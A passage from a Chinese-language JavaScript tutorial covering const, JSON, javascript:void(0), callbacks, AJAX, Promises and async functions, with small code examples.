<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 创建常量对象</span><br><span class="line">const car &#x3D; &#123;type:&quot;Fiat&quot;, model:&quot;500&quot;, color:&quot;white&quot;&#125;;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; 修改属性:</span><br><span class="line">car.color &#x3D; &quot;red&quot;;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; 添加属性</span><br><span class="line">car.owner &#x3D; &quot;Johnson&quot;;</span><br></pre></td></tr></table></figure>

<p>但是我们不能对常量对象重新赋值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const car &#x3D; &#123;type:&quot;Fiat&quot;, model:&quot;500&quot;, color:&quot;white&quot;&#125;;</span><br><span class="line">car &#x3D; &#123;type:&quot;Volvo&quot;, model:&quot;EX60&quot;, color:&quot;red&quot;&#125;;    &#x2F;&#x2F; 错误</span><br></pre></td></tr></table></figure>

<p>以下实例修改常量数组：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 创建常量数组</span><br><span class="line">const cars &#x3D; [&quot;Saab&quot;, &quot;Volvo&quot;, &quot;BMW&quot;];</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; 修改元素</span><br><span class="line">cars[0] &#x3D; &quot;Toyota&quot;;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; 添加元素</span><br><span class="line">cars.push(&quot;Audi&quot;);</span><br></pre></td></tr></table></figure>

<p>但是我们不能对常量数组重新赋值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const cars &#x3D; [&quot;Saab&quot;, &quot;Volvo&quot;, &quot;BMW&quot;];</span><br><span class="line">cars &#x3D; [&quot;Toyota&quot;, &quot;Volvo&quot;, &quot;Audi&quot;];    &#x2F;&#x2F; 错误</span><br></pre></td></tr></table></figure>

<h3 id="重置变量-1"><a href="#重置变量-1" class="headerlink" title="重置变量"></a>重置变量</h3><p>使用 <strong>var</strong> 关键字声明的变量在任何地方都可以修改：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var x &#x3D; 2;    &#x2F;&#x2F;  合法</span><br><span class="line">var x &#x3D; 3;    &#x2F;&#x2F;  合法</span><br><span class="line">x &#x3D; 4;        &#x2F;&#x2F;  合法</span><br></pre></td></tr></table></figure>

<p>在相同的作用域或块级作用域中，不能使用 <strong>const</strong> 关键字来重置 <strong>var</strong> 和 <strong>let</strong>关键字声明的变量:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var x &#x3D; 2;         &#x2F;&#x2F; 合法</span><br><span class="line">const x &#x3D; 2;       &#x2F;&#x2F; 不合法</span><br><span class="line">&#123;</span><br><span class="line">    let x &#x3D; 2;     &#x2F;&#x2F; 合法</span><br><span class="line">    const x &#x3D; 2;   &#x2F;&#x2F; 不合法</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在相同的作用域或块级作用域中，不能使用 <strong>const</strong> 关键字来重置 <strong>const</strong> 关键字声明的变量:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const x &#x3D; 2;       &#x2F;&#x2F; 合法</span><br><span class="line">const x &#x3D; 3;       &#x2F;&#x2F; 不合法</span><br><span class="line">x &#x3D; 3;             &#x2F;&#x2F; 不合法</span><br><span class="line">var x &#x3D; 3;         &#x2F;&#x2F; 不合法</span><br><span class="line">let x &#x3D; 3;         &#x2F;&#x2F; 不合法</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    const x &#x3D; 2;   &#x2F;&#x2F; 合法</span><br><span class="line">    const x &#x3D; 3;   &#x2F;&#x2F; 不合法</span><br><span class="line">    x &#x3D; 3;         &#x2F;&#x2F; 不合法</span><br><span class="line">    var x &#x3D; 3;     &#x2F;&#x2F; 不合法</span><br><span class="line">    let x &#x3D; 3;     &#x2F;&#x2F; 不合法</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>const</strong> 关键字在不同作用域，或不同块级作用域中是可以重新声明赋值的:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const x &#x3D; 2;       &#x2F;&#x2F; 合法</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    const x &#x3D; 3;   &#x2F;&#x2F; 合法</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    const x &#x3D; 4;   &#x2F;&#x2F; 合法</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="变量提升-1"><a href="#变量提升-1" class="headerlink" title="变量提升"></a>变量提升</h3><p>const 关键字定义的变量则不可以在使用后声明，也就是变量需要先声明再使用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">carName &#x3D; &quot;Volvo&quot;;    &#x2F;&#x2F; 在这里不可以使用 carName 变量</span><br><span class="line">const carName &#x3D; &quot;Volvo&quot;;</span><br></pre></td></tr></table></figure>

<h2 id="JavaScript-JSON"><a href="#JavaScript-JSON" class="headerlink" title="JavaScript JSON"></a>JavaScript JSON</h2><p>JSON 是用于存储和传输数据的格式。</p>
<p>JSON 通常用于服务端向网页传递数据 。</p>
<h3 id="什么是JSON？"><a href="#什么是JSON？" class="headerlink" title="什么是JSON？"></a>什么是JSON？</h3><p>JSON 英文全称 <strong>J</strong>ava<strong>S</strong>cript <strong>O</strong>bject <strong>N</strong>otation</p>
<p>JSON 是一种轻量级的数据交换格式。</p>
<p>JSON是独立的语言。</p>
<p>JSON 易于理解。</p>
<p>JSON 使用 JavaScript 语法，但是 JSON 格式仅仅是一个文本。<br>文本可以被任何编程语言读取及作为数据格式传递。</p>
<h3 id="JSON实例"><a href="#JSON实例" class="headerlink" title="JSON实例"></a>JSON实例</h3><p>以下 JSON 语法定义了 sites 对象: 3 条网站信息（对象）的数组:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;sites&quot;:[</span><br><span class="line">    &#123;&quot;name&quot;:&quot;Runoob&quot;, &quot;url&quot;:&quot;www.runoob.com&quot;&#125;, </span><br><span class="line">    &#123;&quot;name&quot;:&quot;Google&quot;, &quot;url&quot;:&quot;www.google.com&quot;&#125;,</span><br><span class="line">    &#123;&quot;name&quot;:&quot;Taobao&quot;, &quot;url&quot;:&quot;www.taobao.com&quot;&#125;</span><br><span class="line">]&#125;</span><br></pre></td></tr></table></figure>

<h3 id="JSON格式化后为JavaScript对象"><a href="#JSON格式化后为JavaScript对象" class="headerlink" title="JSON格式化后为JavaScript对象"></a>JSON格式化后为JavaScript对象</h3><p>JSON 格式在语法上与创建 JavaScript 对象代码是相同的。</p>
<p>由于它们很相似，所以 JavaScript 程序可以很容易的将 JSON 数据转换为 JavaScript 对象。</p>
<h3 id="JSON语法规则"><a href="#JSON语法规则" class="headerlink" title="JSON语法规则"></a>JSON语法规则</h3><p>数据为 键/值 对。</p>
<p>数据由逗号分隔。</p>
<p>大括号保存对象</p>
<p>方括号保存数组</p>
<h3 id="JSON数据-一个名称对应一个值"><a href="#JSON数据-一个名称对应一个值" class="headerlink" title="JSON数据 - 一个名称对应一个值"></a>JSON数据 - 一个名称对应一个值</h3><p>JSON 数据格式为 键/值 对，就像 JavaScript 对象属性。</p>
<p>键/值对包括字段名称（在双引号中），后面一个冒号，然后是值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;nickname&quot;:&quot;Tianze&quot;</span><br></pre></td></tr></table></figure>

<h3 id="JSON对象"><a href="#JSON对象" class="headerlink" title="JSON对象"></a>JSON对象</h3><p>JSON 数组保存在中括号内。</p>
<p>就像在 JavaScript 中, 数组可以包含对象：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&quot;Runoob&quot;, &quot;url&quot;:&quot;www.runoob.com&quot;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="JSON数组"><a href="#JSON数组" class="headerlink" title="JSON数组"></a>JSON数组</h3><p>JSON 数组保存在中括号内。</p>
<p>就像在 JavaScript 中, 数组可以包含对象：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;sites&quot;:[</span><br><span class="line">    &#123;&quot;name&quot;:&quot;Runoob&quot;, &quot;url&quot;:&quot;www.runoob.com&quot;&#125;, </span><br><span class="line">    &#123;&quot;name&quot;:&quot;Google&quot;, &quot;url&quot;:&quot;www.google.com&quot;&#125;,</span><br><span class="line">    &#123;&quot;name&quot;:&quot;Taobao&quot;, &quot;url&quot;:&quot;www.taobao.com&quot;&#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>在以上实例中，对象 “sites” 是一个数组，包含了三个对象。</p>
<p>每个对象为站点的信息（网站名和网站地址）。</p>
<h3 id="JSON字符串转换为JavaScript对象"><a href="#JSON字符串转换为JavaScript对象" class="headerlink" title="JSON字符串转换为JavaScript对象"></a>JSON字符串转换为JavaScript对象</h3><p>通常我们从服务器中读取 JSON 数据，并在网页中显示数据。</p>
<p>简单起见，我们网页中直接设置 JSON 字符串:</p>
<p>首先，创建 JavaScript 字符串，字符串为 JSON 格式的数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var text &#x3D; &#39;&#123; &quot;sites&quot; : [&#39; +</span><br><span class="line">&#39;&#123; &quot;name&quot;:&quot;Runoob&quot; , &quot;url&quot;:&quot;www.runoob.com&quot; &#125;,&#39; +</span><br><span class="line">&#39;&#123; &quot;name&quot;:&quot;Google&quot; , &quot;url&quot;:&quot;www.google.com&quot; &#125;,&#39; +</span><br><span class="line">&#39;&#123; &quot;name&quot;:&quot;Taobao&quot; , &quot;url&quot;:&quot;www.taobao.com&quot; &#125; ]&#125;&#39;;</span><br></pre></td></tr></table></figure>

<p>然后，使用 JavaScript 内置函数 JSON.parse() 将字符串转换为 JavaScript 对象:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var obj &#x3D; JSON.parse(text);</span><br></pre></td></tr></table></figure>

<p>最后，在你的页面中使用新的 JavaScript 对象：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var text &#x3D; &#39;&#123; &quot;sites&quot; : [&#39; +</span><br><span class="line">    &#39;&#123; &quot;name&quot;:&quot;Runoob&quot; , &quot;url&quot;:&quot;www.runoob.com&quot; &#125;,&#39; +</span><br><span class="line">    &#39;&#123; &quot;name&quot;:&quot;Google&quot; , &quot;url&quot;:&quot;www.google.com&quot; &#125;,&#39; +</span><br><span class="line">    &#39;&#123; &quot;name&quot;:&quot;Taobao&quot; , &quot;url&quot;:&quot;www.taobao.com&quot; &#125; ]&#125;&#39;;</span><br><span class="line">    </span><br><span class="line">obj &#x3D; JSON.parse(text);</span><br><span class="line">document.getElementById(&quot;demo&quot;).innerHTML &#x3D; obj.sites[1].name + &quot; &quot; + obj.sites[1].url;</span><br></pre></td></tr></table></figure>

<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><a href="https://www.runoob.com/js/javascript-json-parse.html" target="_blank" rel="noopener">JSON.parse()</a></td>
<td align="left">用于将一个 JSON 字符串转换为 JavaScript 对象。</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/js/javascript-json-stringify.html" target="_blank" rel="noopener">JSON.stringify()</a></td>
<td align="left">用于将 JavaScript 值转换为 JSON 字符串。</td>
</tr>
</tbody></table>
<h2 id="JavaScript-void"><a href="#JavaScript-void" class="headerlink" title="JavaScript void"></a>JavaScript void</h2><h3 id="JavaScript-void-0-含义"><a href="#JavaScript-void-0-含义" class="headerlink" title="JavaScript:void(0) 含义"></a>JavaScript:void(0) 含义</h3><p>我们经常会使用到 <strong>javascript:void(0)</strong> 这样的代码，那么在 JavaScript 中 <strong>javascript:void(0)</strong> 代表的是什么意思呢？</p>
<p><strong>javascript:void(0)</strong> 中最关键的是 <strong>void</strong> 关键字， <strong>void</strong> 是 JavaScript 中非常重要的关键字，该操作符指定要计算一个表达式但是不返回值。</p>
<p>语法格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void func()</span><br><span class="line">javascript:void func()</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void(func())</span><br><span class="line">javascript:void(func())</span><br></pre></td></tr></table></figure>

<p>下面的代码创建了一个超级链接，当用户点击以后不会发生任何事。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javascript:void(0)&quot;&gt;单击此处什么也不会发生&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>当用户链接时，void(0) 计算为 0，但 Javascript 上没有任何效果。</p>
<p>以下实例中，在用户点击链接后显示警告信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;点击以下链接查看结果：&lt;&#x2F;p&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;javascript:void(alert(&#39;Warning!!!&#39;))&quot;&gt;点我!&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>以下实例中参数 a 将返回 undefined :</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getValue()&#123;</span><br><span class="line">   var a,b,c;</span><br><span class="line">   a &#x3D; void ( b &#x3D; 5, c &#x3D; 7 );</span><br><span class="line">   document.write(&#39;a &#x3D; &#39; + a + &#39; b &#x3D; &#39; + b +&#39; c &#x3D; &#39; + c );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="href-”-”与href-”javascript-void-0-”的区别"><a href="#href-”-”与href-”javascript-void-0-”的区别" class="headerlink" title="href=”#”与href=”javascript:void(0)”的区别"></a>href=”#”与href=”javascript:void(0)”的区别</h3><p><strong>#</strong> 包含了一个位置信息，默认的锚是<strong>#top</strong> 也就是网页的上端。</p>
<p>而javascript:void(0), 仅仅表示一个死链接。</p>
<p>在页面很长的时候会使用 <strong>#</strong> 来定位页面的具体位置，格式为：<strong># + id</strong>。</p>
<p>如果你要定义一个死链接请使用 javascript:void(0) 。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;javascript:void(0);&quot;&gt;点我没有反应的!&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;#pos&quot;&gt;点我定位到指定位置!&lt;&#x2F;a&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">...</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;p id&#x3D;&quot;pos&quot;&gt;尾部定位点&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>

<h2 id="JavaScript-异步编程"><a href="#JavaScript-异步编程" class="headerlink" title="JavaScript 异步编程"></a>JavaScript 异步编程</h2><h3 id="异步的概念"><a href="#异步的概念" class="headerlink" title="异步的概念"></a>异步的概念</h3><p>异步（Asynchronous, async）是与同步（Synchronous, sync）相对的概念。</p>
<p>在我们学习的传统单线程编程中，程序的运行是同步的（同步不意味着所有步骤同时运行，而是指步骤在一个控制流序列中按顺序执行）。而异步的概念则是不保证同步的概念，也就是说，一个异步过程的执行将不再与原有的序列有顺序关系。</p>
<p>简单来理解就是：同步按你的代码顺序执行，异步不按照代码顺序执行，异步的执行效率更高。</p>
<p>以上是关于异步的概念的解释，接下来我们通俗地解释一下异步：异步就是从主线程发射一个子线程来完成任务。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/async-sync.png" alt="img"></p>
<h3 id="什么时候用异步编程"><a href="#什么时候用异步编程" class="headerlink" title="什么时候用异步编程"></a>什么时候用异步编程</h3><p>在前端编程中（甚至后端有时也是这样），我们在处理一些简短、快速的操作时，例如计算 1 + 1 的结果，往往在主线程中就可以完成。主线程作为一个线程，不能够同时接受多方面的请求。所以，当一个事件没有结束时，界面将无法处理其他请求。</p>
<p>现在有一个按钮，如果我们设置它的 onclick 事件为一个死循环，那么当这个按钮按下，整个网页将失去响应。</p>
<p>为了避免这种情况的发生，我们常常用子线程来完成一些可能消耗时间足够长以至于被用户察觉的事情，比如读取一个大文件或者发出一个网络请求。因为子线程独立于主线程，所以即使出现阻塞也不会影响主线程的运行。但是子线程有一个局限：一旦发射了以后就会与主线程失去同步，我们无法确定它的结束，如果结束之后需要处理一些事情，比如处理来自服务器的信息，我们是无法将它合并到主线程中去的。</p>
<p>为了解决这个问题，JavaScript 中的异步操作函数往往通过回调函数来实现异步任务的结果处理。</p>
<h3 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h3><p>回调函数就是一个函数，它是在我们启动一个异步任务的时候就告诉它：等你完成了这个任务之后要干什么。这样一来主线程几乎不用关心异步任务的状态了，他自己会善始善终。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function print() &#123;</span><br><span class="line">    document.getElementById(&quot;demo&quot;).innerHTML&#x3D;&quot;RUNOOB!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(print, 3000);</span><br></pre></td></tr></table></figure>

<p>这段程序中的 setTimeout 就是一个消耗时间较长（3 秒）的过程，它的第一个参数是个回调函数，第二个参数是毫秒数，这个函数执行之后会产生一个子线程，子线程会等待 3 秒，然后执行回调函数 “print”，在命令行输出 “Time out”。</p>
<p>当然，JavaScript 语法十分友好，我们不必单独定义一个函数 print ，我们常常将上面的程序写成：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setTimeout(function () &#123;</span><br><span class="line">    document.getElementById(&quot;demo&quot;).innerHTML&#x3D;&quot;RUNOOB!&quot;;</span><br><span class="line">&#125;, 3000);</span><br></pre></td></tr></table></figure>

<p>既然 setTimeout 会在子线程中等待 3 秒，在 setTimeout 函数执行之后主线程并没有停止，所以：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setTimeout(function () &#123;</span><br><span class="line">    document.getElementById(&quot;demo1&quot;).innerHTML&#x3D;&quot;RUNOOB-1!&quot;;</span><br><span class="line">&#125;, 3000);</span><br><span class="line">document.getElementById(&quot;demo2&quot;).innerHTML&#x3D;&quot;RUNOOB-2!&quot;;</span><br><span class="line">console.log(&quot;2&quot;);</span><br></pre></td></tr></table></figure>

<p>这段程序的执行结果是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RUNOOB-1!</span><br><span class="line">RUNOOB-2!</span><br></pre></td></tr></table></figure>

<h3 id="异步AJAX"><a href="#异步AJAX" class="headerlink" title="异步AJAX"></a>异步AJAX</h3><p>除了 setTimeout 函数以外，异步回调广泛应用于 AJAX 编程。有关于 AJAX 详细请参见：<a href="https://www.runoob.com/ajax/ajax-tutorial.html" target="_blank" rel="noopener">https://www.runoob.com/ajax/ajax-tutorial.html</a></p>
<p>XMLHttpRequest 常常用于请求来自远程服务器上的 XML 或 JSON 数据。一个标准的 XMLHttpRequest 对象往往包含多个回调：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var xhr &#x3D; new XMLHttpRequest();</span><br><span class="line"> </span><br><span class="line">xhr.onload &#x3D; function () &#123;</span><br><span class="line">    &#x2F;&#x2F; 输出接收到的文字数据</span><br><span class="line">    document.getElementById(&quot;demo&quot;).innerHTML&#x3D;xhr.responseText;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">xhr.onerror &#x3D; function () &#123;</span><br><span class="line">    document.getElementById(&quot;demo&quot;).innerHTML&#x3D;&quot;请求出错&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; 发送异步 GET 请求</span><br><span class="line">xhr.open(&quot;GET&quot;, &quot;https:&#x2F;&#x2F;www.runoob.com&#x2F;try&#x2F;ajax&#x2F;ajax_info.txt&quot;, true);</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure>

<p>XMLHttpRequest 的 onload 和 onerror 属性都是函数，分别在它请求成功和请求失败时被调用。如果你使用完整的 jQuery 库，也可以更加优雅的使用异步 AJAX：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$.get(&quot;https:&#x2F;&#x2F;www.runoob.com&#x2F;try&#x2F;ajax&#x2F;demo_test.php&quot;,function(data,status)&#123;</span><br><span class="line">    alert(&quot;数据: &quot; + data + &quot;\n状态: &quot; + status);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="JavaScript-Promise"><a href="#JavaScript-Promise" class="headerlink" title="JavaScript Promise"></a>JavaScript Promise</h2><p>Promise 是一个 ECMAScript 6 提供的类，目的是更加优雅地书写复杂的异步任务。</p>
<p>由于 Promise 是 ES6 新增加的，所以一些旧的浏览器并不支持，苹果的 Safari 10 和 Windows 的 Edge 14 版本以上浏览器才开始支持 ES6 特性。</p>
<h3 id="构造Promise"><a href="#构造Promise" class="headerlink" title="构造Promise"></a>构造Promise</h3><p>现在我们新建一个 Promise 对象：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">new Promise(function (resolve, reject) &#123;</span><br><span class="line">    &#x2F;&#x2F; 要做的事情...</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>通过新建一个 Promise 对象好像并没有看出它怎样 “更加优雅地书写复杂的异步任务”。我们之前遇到的异步任务都是一次异步，如果需要多次调用异步函数呢？例如，如果我想分三次输出字符串，第一次间隔 1 秒，第二次间隔 4 秒，第三次间隔 3 秒：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setTimeout(function () &#123;</span><br><span class="line">    console.log(&quot;First&quot;);</span><br><span class="line">    setTimeout(function () &#123;</span><br><span class="line">        console.log(&quot;Second&quot;);</span><br><span class="line">        setTimeout(function () &#123;</span><br><span class="line">            console.log(&quot;Third&quot;);</span><br><span class="line">        &#125;, 3000);</span><br><span class="line">    &#125;, 4000);</span><br><span class="line">&#125;, 1000);</span><br></pre></td></tr></table></figure>

<p>这段程序实现了这个功能，但是它是用 “函数瀑布” 来实现的。可想而知，在一个复杂的程序当中，用 “函数瀑布” 实现的程序无论是维护还是异常处理都是一件特别繁琐的事情，而且会让缩进格式变得非常冗赘。</p>
<p>现在我们用 Promise 来实现同样的功能：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">new Promise(function (resolve, reject) &#123;</span><br><span class="line">    setTimeout(function () &#123;</span><br><span class="line">        console.log(&quot;First&quot;);</span><br><span class="line">        resolve();</span><br><span class="line">    &#125;, 1000);</span><br><span class="line">&#125;).then(function () &#123;</span><br><span class="line">    return new Promise(function (resolve, reject) &#123;</span><br><span class="line">        setTimeout(function () &#123;</span><br><span class="line">            console.log(&quot;Second&quot;);</span><br><span class="line">            resolve();</span><br><span class="line">        &#125;, 4000);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;).then(function () &#123;</span><br><span class="line">    setTimeout(function () &#123;</span><br><span class="line">        console.log(&quot;Third&quot;);</span><br><span class="line">    &#125;, 3000);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>这段代码较长，所以还不需要完全理解它，我想引起注意的是 Promise 将嵌套格式的代码变成了顺序格式的代码。</p>
<h3 id="Promise的使用"><a href="#Promise的使用" class="headerlink" title="Promise的使用"></a>Promise的使用</h3><p>下面我们通过剖析这段 Promise “计时器” 代码来讲述 Promise 的使用：</p>
<p>Promise 构造函数只有一个参数，是一个函数，这个函数在构造之后会直接被异步运行，所以我们称之为起始函数。起始函数包含两个参数 resolve 和 reject。</p>
<p>当 Promise 被构造时，起始函数会被异步执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">new Promise(function (resolve, reject) &#123;</span><br><span class="line">    console.log(&quot;Run&quot;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>这段程序会直接输出 <strong>Run</strong>。</p>
<p>resolve 和 reject 都是函数，其中调用 resolve 代表一切正常，reject 是出现异常时所调用的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">new Promise(function (resolve, reject) &#123;</span><br><span class="line">    var a &#x3D; 0;</span><br><span class="line">    var b &#x3D; 1;</span><br><span class="line">    if (b &#x3D;&#x3D; 0) reject(&quot;Diveide zero&quot;);</span><br><span class="line">    else resolve(a &#x2F; b);</span><br><span class="line">&#125;).then(function (value) &#123;</span><br><span class="line">    console.log(&quot;a &#x2F; b &#x3D; &quot; + value);</span><br><span class="line">&#125;).catch(function (err) &#123;</span><br><span class="line">    console.log(err);</span><br><span class="line">&#125;).finally(function () &#123;</span><br><span class="line">    console.log(&quot;End&quot;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>这段程序执行结果是:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x2F; b &#x3D; 0</span><br><span class="line">End</span><br></pre></td></tr></table></figure>

<p>Promise 类有 .then() .catch() 和 .finally() 三个方法，这三个方法的参数都是一个函数，.then() 可以将参数中的函数添加到当前 Promise 的正常执行序列，.catch() 则是设定 Promise 的异常处理序列，.finally() 是在 Promise 执行的最后一定会执行的序列。 .then() 传入的函数会按顺序依次执行，有任何异常都会直接跳到 catch 序列：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">new Promise(function (resolve, reject) &#123;</span><br><span class="line">    console.log(1111);</span><br><span class="line">    resolve(2222);</span><br><span class="line">&#125;).then(function (value) &#123;</span><br><span class="line">    console.log(value);</span><br><span class="line">    return 3333;</span><br><span class="line">&#125;).then(function (value) &#123;</span><br><span class="line">    console.log(value);</span><br><span class="line">    throw &quot;An error&quot;;</span><br><span class="line">&#125;).catch(function (err) &#123;</span><br><span class="line">    console.log(err);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>执行结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1111</span><br><span class="line">2222</span><br><span class="line">3333</span><br><span class="line">An error</span><br></pre></td></tr></table></figure>

<p>resolve() 中可以放置一个参数用于向下一个 then 传递一个值，then 中的函数也可以返回一个值传递给 then。但是，如果 then 中返回的是一个 Promise 对象，那么下一个 then 将相当于对这个返回的 Promise 进行操作，这一点从刚才的计时器的例子中可以看出来。</p>
<p>reject() 参数中一般会传递一个异常给之后的 catch 函数用于处理异常。</p>
<p>但是请注意以下两点：</p>
<ul>
<li>resolve 和 reject 的作用域只有起始函数，不包括 then 以及其他序列；</li>
<li>resolve 和 reject 并不能够使起始函数停止运行，别忘了 return。</li>
</ul>
<h3 id="Promise函数"><a href="#Promise函数" class="headerlink" title="Promise函数"></a>Promise函数</h3><p>上述的 “计时器” 程序看上去比函数瀑布还要长，所以我们可以将它的核心部分写成一个 Promise 函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function print(delay, message) &#123;</span><br><span class="line">    return new Promise(function (resolve, reject) &#123;</span><br><span class="line">        setTimeout(function () &#123;</span><br><span class="line">            console.log(message);</span><br><span class="line">            resolve();</span><br><span class="line">        &#125;, delay);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后我们就可以放心大胆的实现程序功能了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(1000, &quot;First&quot;).then(function () &#123;</span><br><span class="line">    return print(4000, &quot;Second&quot;);</span><br><span class="line">&#125;).then(function () &#123;</span><br><span class="line">    print(3000, &quot;Third&quot;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>这种返回值为一个 Promise 对象的函数称作 Promise 函数，它常常用于开发基于异步操作的库。</p>
<h3 id="异步函数"><a href="#异步函数" class="headerlink" title="异步函数"></a>异步函数</h3><p>异步函数（async function）是 ECMAScript 2017 (ECMA-262) 标准的规范，几乎被所有浏览器所支持，除了 Internet Explorer。</p>
<p>在 Promise 中我们编写过一个 Promise 函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function print(delay, message) &#123;</span><br><span class="line">    return new Promise(function (resolve, reject) &#123;</span><br><span class="line">        setTimeout(function () &#123;</span><br><span class="line">            console.log(message);</span><br><span class="line">            resolve();</span><br><span class="line">        &#125;, delay);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后用不同的时间间隔输出了三行文本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(1000, &quot;First&quot;).then(function () &#123;</span><br><span class="line">    return print(4000, &quot;Second&quot;);</span><br><span class="line">&#125;).then(function () &#123;</span><br><span class="line">    print(3000, &quot;Third&quot;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>我们可以将这段代码变得更好看：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">async function asyncFunc() &#123;</span><br><span class="line">    await print(1000, &quot;First&quot;);</span><br><span class="line">    await print(4000, &quot;Second&quot;);</span><br><span class="line">    await print(3000, &quot;Third&quot;);</span><br><span class="line">&#125;</span><br><span class="line">asyncFunc();</span><br></pre></td></tr></table></figure>

<p>异步函数 async function 中可以使用 await 指令，await 指令后必须跟着一个 Promise，异步函数会在这个 Promise 运行中暂停，直到其运行结束再继续运行。</p>
<p>异步函数实际上原理与 Promise 原生 API 的机制是一模一样的，只不过更便于程序员阅读。</p>
<p>处理异常的机制将用 try-catch 块实现：</p>
